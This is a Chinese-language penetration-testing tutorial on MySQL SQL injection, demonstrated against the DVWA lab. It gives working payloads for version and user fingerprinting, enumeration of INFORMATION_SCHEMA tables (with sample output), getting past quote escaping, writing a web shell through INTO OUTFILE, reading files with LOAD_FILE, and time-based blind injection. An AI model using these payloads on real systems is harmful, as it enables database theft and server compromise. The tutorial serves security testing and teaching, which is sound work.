
# Mysql SQL Injection

## 摘要

凡是没有充分约束或清理用户输入，而且使用这些输入构造SQL查询，就会发生SQL注入漏洞。使用动态SQL（通过字符串连接构造SQL查询）为这些漏洞打开了大门。SQL注入使攻击者可以访问SQL服务器。它允许在用于连接数据库的用户权限下执行SQL代码。

MySQL服务器具有一些特殊性，因此某些漏洞需要为此专门定制。这是本节的主题。

## 测试方法
当在由MySQL数据库支持的应用程序中发现SQL注入漏洞时，根据MySQL版本和DBMS上的用户权限，可能会执行多种攻击。

MySQL至少有4个版本较为常见：3.23.x，4.0.x，4.1.x和5.0.x。每个版本都有一组能揭示当前版本的特性指纹。
- 4.0之后：增加了 UNION
- 4.1之后：增加了 Subqueries
- 5.0之后，增加了： 存储过程、存储函数、命名为 INFORMATION_SCHEMA 的视图
- 5.0.2之后，增加了：Triggers

注意，对于MSSQL 4.0.x之前的版本，仅Boolean或基于时间的盲注攻击可以使用，因为子查询功能或UNION语句还没有实现。

现在，我们假设有一个典型的SQL注入漏洞，其请求链接为：```http://www.example.com/page.php?id=2```.

### 单引号问题

在利用MySQL特性之前，必须考虑如何在语句中表示字符串，因为Web应用程序通常会用单引号引起来。Mysql引号转义如下：
```'A string with \'quotes\''```

这里，Mysql解释```\'```为字符，而不是元字符。所以假如应用正常工作，下面两个使用静态字符串的例子是有区别的：
- Web应用转义单引号```'```为```\'```
- Web应用不转义单引号```'```为```'```

在Mysql中，有一种标准做法可以绕过单引号，即不使用单引号来声明静态字符串。假设我们想知道某个名为 password 字段的值，那么查询条件可以如下组织：
- ```password like 'A%'```
- ASCII值以十六进制形式拼接：```password like 0x4125```
- 使用函数```char()```: ```password LIKE CHAR(65,37)``` 。CHAR()将每个参数N理解为一个整数，其返回值为一个包含这些整数的代码值所给出的字符的字符串。NULL值被省略。

### 多种混合查询

Mysql库连接器不支持使用```;```区分的多查询，因此无法像Microsoft SQL Server一样在单个SQL注入漏洞中注入多个非同类SQL命令。例如，下列语句会错误：```1 ; update tablename set code='javascript code' where 1 --```

#### 信息收集

##### 指纹发现

首先要知道的是是否有MySQL DBMS作为后端数据库。MySQL服务器具有一项功能，该功能用于让其他DBMS忽略MySQL方言中的子句。当注释块```'/**/'```包含感叹号时，```'/*! sql here*/'```它将由MySQL解释，并由其他DBMS视为普通注释块，正如MySQL手册中所述。

例如：
```1 /*! and 1=0 */```
如果后台运行mysql，那么注释块中的内容会被解释执行。

##### 版本号
有3种方法收集版本信息
- 使用 global variable ```@@version```
- 使用函数 ```VERSION()```
- 使用含有版本号的注释指纹 ```/*!40110 and 1=0*/``` ，这意味着下列语句

```/*!40110 and 1=0*/``` ，这意味着下列语句:
```
if(version >= 4.1.10)
    add 'and 1=0' to the query
```
与之有相同结果的还有：
- 盲注：```1 AND 1=0 UNION SELECT @@version /*```
- 推断注入：```1 AND @@version like '4.0%'```。响应将包含类似```5.0.22-log```的行。

例如DVWA靶机可执行下列语句：
```adf' or 1=1 union select version(),'1 ``` 或 ```adf' or 1=1 union select @@version,'1 ```
结果如下图：
<img src="images/07/mysqli01.png" width="480" >


#####  登录用户

MySQL Server依赖两种用户。
1.USER()：连接到MySQL服务器的用户。
2.CURRENT_USER()：正在执行查询的内部用户。

1和2之间有一些区别。主要的区别在于，匿名用户可以连接（如果允许）任何名称，但MySQL内部用户是一个空名称（''）。另一个区别是，如果未在其他地方声明，则存储过程或存储函数将作为创建者用户执行。可以使用来知道CURRENT_USER。

- In band injection: ```1 AND 1=0 UNION SELECT USER()```

- Inferential injection: ```1 AND USER() like 'root%'```

结果可能包含：```user@hostname```

##### 获取数据库名

mysql有一个内置的函数：```database()```

- In band injection:```1 AND 1=0 UNION SELECT DATABASE()```
- Inferential injection:```1 AND DATABASE() like 'db%'```

结果为数据库名。

##### INFOMATION_SCHEMA
mysql 5.0之后，有了 INFOMATION_SCHEMA ，它可以获取数据中所有的数据库、表、列、存储过程、函数。

|INFOMATION_SCHEMA中的表|描述|
|-|-|
|SCHEMATA	|有 SELECT_priv 权的用户所有的数据库|
|SCHEMA_PRIVILEGES	|The privileges the user has for each DB|
|TABLES	|All tables the user has (at least) SELECT_priv|
|TABLE_PRIVILEGES	|The privileges the user has for each table|
|COLUMNS	|All columns the user has (at least) SELECT_priv|
|COLUMN_PRIVILEGES	|The privileges the user has for each column|
|VIEWS	|All columns the user has (at least) SELECT_priv|
|ROUTINES	|Procedures and functions (needs EXECUTE_priv)|
|TRIGGERS	|Triggers (needs INSERT_priv)|
|USER_PRIVILEGES	|Privileges connected User has|

上述信息可以通过SQL注入来实现。

例如dvwa中盲注sql页例子：```1' union select table_name ,1 from information_schema.tables where '1'='1```
结果如下：
```
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: admin
Surname: admin
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: CHARACTER_SETS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: COLLATIONS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: COLLATION_CHARACTER_SET_APPLICABILITY
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: COLUMNS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: COLUMN_PRIVILEGES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: ENGINES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: EVENTS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: FILES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: GLOBAL_STATUS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: GLOBAL_VARIABLES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: KEY_COLUMN_USAGE
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: PARTITIONS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: PLUGINS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: PROCESSLIST
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: PROFILING
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: REFERENTIAL_CONSTRAINTS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: ROUTINES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: SCHEMATA
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: SCHEMA_PRIVILEGES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: SESSION_STATUS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: SESSION_VARIABLES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: STATISTICS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: TABLES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: TABLE_CONSTRAINTS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: TABLE_PRIVILEGES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: TRIGGERS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: USER_PRIVILEGES
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: VIEWS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: guestbook
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: users
Surname: 1
```

#### 攻击向量
##### 写在一个文件中
如果连接数据库使用的用户有```FILE```权限，且单引号不会被过滤，那么```inot outfile```这种字句就可能被用于导出查询结果到一个文件。SQL语句例如：```Select * from table into outfile '/tmp/file'```

注意：无法绕过文件名周围的单引号。因此，如果对单引号（例如转义）进行了一些清理，```\'```将无法使用“ into outfile”子句。

这种攻击可用作带外技术，以获取有关查询结果的信息或编写可在Web服务器目录中执行的文件。

Example:

```1 limit 1 into outfile '/var/www/root/test.jsp' FIELDS ENCLOSED BY '//'  LINES TERMINATED BY '\n<%jsp code here%>';```

Results are stored in a file with rw-rw-rw privileges owned by MySQL user and group.

Where /var/www/root/test.jsp will contain:

```//field values// <%jsp code here%>```

##### 从文件中读

```Load_file```是一个能读文件的mysql内置文件，在有文件系统权限时可以使用。如果连接用户有文件权限，他可能使用某个文件的内容，如果单引号被限制，那么可以使用之前讨论的方法进行绕过。
```load_file('filename')```

#### 标准SQL注入攻击

在标准SQL注入中，您可以将结果直接显示为正常输出或MySQL错误的页面。通过使用已经提到的SQL Injection攻击和已经描述的MySQL功能，直接SQL注入可以很容易地在一个层次上完成，这主要取决于pentester所面对的MySQL版本。

一个好的攻击方法是通过强制函数/过程或服务器本身抛出错误来了解结果。在MySQL手册上可以找到由MySQL引发的错误列表，特别是本机函数。

#### 带外SQL注入
带外注入可以通过使用“ into outfile”子句来完成。

#### 盲注
对于盲目SQL注入，MySQL服务器本身提供了一组有用的功能。

- 字串长度：```LENGTH(str)```
- 从给定的字符串中提取一个子字符串：```SUBSTRING(string, offset, #chars_returned)```
- 基于时间的盲注：```BENCHMARK(#ofcycles,action_to_be_performed)``` 。 当Boolean攻击无任何结果时，可尝试benchmark函数执行计时攻击。也可以使用```SLEEP()```函数作为替代方法（MySQL> 5.0.x）。

例如dvwa盲注处可键入```1' and sleep(5) and '1'='1```,会发现过了5秒后才响应。

```1' and benchmark(500000,md5(1)) and '1'='1```,执行500000次的md5(1).
这些都说明注入有效。

### 工具

Francois Larouche：多个DBMS SQL注入工具
Reversing.org-sqlbftools
Bernardo Damele AG：sqlmap，自动SQL注入工具
Muhaimin Dzulfakar：MySqloit，MySql注入接管工具

